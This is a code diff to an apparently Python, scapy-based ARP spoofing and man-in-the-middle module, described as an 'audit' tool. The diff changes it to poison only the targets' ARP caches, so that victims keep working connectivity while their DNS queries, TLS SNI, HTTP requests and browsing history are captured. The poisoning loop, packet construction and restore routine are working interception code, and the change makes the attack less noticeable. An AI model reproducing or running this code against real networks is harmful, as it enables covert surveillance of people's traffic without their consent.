@@ -1,9 +1,11 @@
 """
-ARP Spoofer / MITM Engine — Active network interception.
+ARP Spoofer / MITM Engine — Active network interception (Half-Duplex).
 
-Redirects traffic from target devices through the audit PC by sending
-crafted ARP replies. Combined with the passive sniffer, this enables
-full browsing history extraction (TLS SNI, DNS, HTTP) for every target.
+Redirects OUTBOUND traffic from target devices through the audit PC by
+sending crafted ARP replies (target-only poisoning). The gateway is NOT
+poisoned, so return traffic flows directly to targets — this prevents
+connectivity disruption while still capturing all audit-relevant data
+(DNS queries, TLS SNI, HTTP requests, browsing history).
 
 Safety:
 - atexit handler restores ARP tables on crash/exit
@@ -368,31 +370,23 @@ class ArpSpoofer:
                         break
 
                     try:
+                        # Half-Duplex: ONLY poison the TARGET's ARP cache.
                         # Tell the TARGET: "Gateway IP is at MY MAC"
-                        # This makes the target send internet traffic to us
+                        # This makes the target send outbound traffic to us.
+                        # The GATEWAY is NOT poisoned — return traffic goes
+                        # directly to the target, so connectivity is preserved.
                         pkt_to_target = Ether(dst=target_mac) / ARP(
                             op=2,  # ARP Reply
                             psrc=self._gateway_ip,    # "I am the gateway"
-                            hwsrc=self._local_mac,     # "My MAC is your MAC"
+                            hwsrc=self._local_mac,     # "My MAC is ..."
                             pdst=target_ip,            # Addressed to target
                             hwdst=target_mac,
                         )
 
-                        # Tell the GATEWAY: "Target IP is at MY MAC"
-                        # This makes the router send reply traffic to us
-                        pkt_to_gateway = Ether(dst=self._gateway_mac) / ARP(
-                            op=2,  # ARP Reply
-                            psrc=target_ip,            # "I am the target"
-                            hwsrc=self._local_mac,     # "My MAC is your MAC"
-                            pdst=self._gateway_ip,     # Addressed to gateway
-                            hwdst=self._gateway_mac,
-                        )
-
                         sendp(pkt_to_target, iface=self._interface, verbose=False)
-                        sendp(pkt_to_gateway, iface=self._interface, verbose=False)
 
                         with self._lock:
-                            self._packets_sent += 2
+                            self._packets_sent += 1
 
                     except Exception as e:
                         print(f"[MITM] Spoof error for {target_ip}: {e}")
@@ -402,8 +396,8 @@ class ArpSpoofer:
                     self._refresh_targets()
                     self._last_refresh = time.time()
 
-                # Send every 1.5 seconds to keep ARP cache poisoned
-                for _ in range(15):  # 1.5 seconds in 0.1s increments
+                # Send every 2 seconds to keep ARP cache poisoned
+                for _ in range(20):  # 2 seconds in 0.1s increments
                     if not self._running:
                         break
                     time.sleep(0.1)
@@ -475,11 +469,15 @@ class ArpSpoofer:
             print(f"[MITM] Auto-refresh error: {e}")
 
     def _restore_arp(self) -> None:
-        """Send correct ARP replies to restore all poisoned entries."""
+        """Send correct ARP replies to restore all poisoned target entries.
+        
+        Half-duplex: only targets were poisoned, so only targets need
+        restoration. The gateway was never touched.
+        """
         try:
             from scapy.all import ARP, Ether, sendp
 
-            print("[MITM] Restoring ARP tables...")
+            print("[MITM] Restoring target ARP tables...")
 
             for target_ip, target_mac in self._targets.items():
                 # Send 5 corrections to ensure restoration
@@ -494,22 +492,12 @@ class ArpSpoofer:
                             hwdst=target_mac,
                         )
 
-                        # Tell the GATEWAY: "Target IP is at TARGET's real MAC"
-                        restore_gateway = Ether(dst=self._gateway_mac) / ARP(
-                            op=2,
-                            psrc=target_ip,
-                            hwsrc=target_mac,  # Real target MAC
-                            pdst=self._gateway_ip,
-                            hwdst=self._gateway_mac,
-                        )
-
                         sendp(restore_target, iface=self._interface, verbose=False)
-                        sendp(restore_gateway, iface=self._interface, verbose=False)
                     except Exception:
                         pass
                     time.sleep(0.2)
 
-            print("[MITM] ARP tables restored successfully")
+            print("[MITM] Target ARP tables restored successfully")
 
         except Exception as e:
             print(f"[MITM] ARP restore error: {e}")
